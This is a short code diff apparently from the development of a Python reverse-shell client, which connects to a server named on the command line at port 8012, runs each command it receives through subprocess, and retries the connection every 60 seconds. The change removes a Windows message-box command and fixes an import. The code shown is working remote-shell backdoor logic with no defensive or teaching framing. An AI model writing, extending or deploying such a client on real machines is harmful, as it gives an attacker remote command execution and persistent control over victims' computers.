@@ -2,7 +2,7 @@ import socket
 import os
 import subprocess
 import time
-import win32api
+import sys
 
 SERVER_HOST = sys.argv[1]
 SERVER_PORT = 8012
@@ -28,8 +28,6 @@ while True:
                     output = ""
             elif splited_command[0].lower() == "test":
                 continue
-            elif command.startswith("reverseshell alert"):
-                win32api.MessageBox(0, splited_command[3], splited_command[2], 0x00001000) 
             else:
                 output = subprocess.getoutput(command)
             cwd = os.getcwd()
@@ -38,4 +36,3 @@ while True:
     except:
         s.close()
         time.sleep(60)
-    
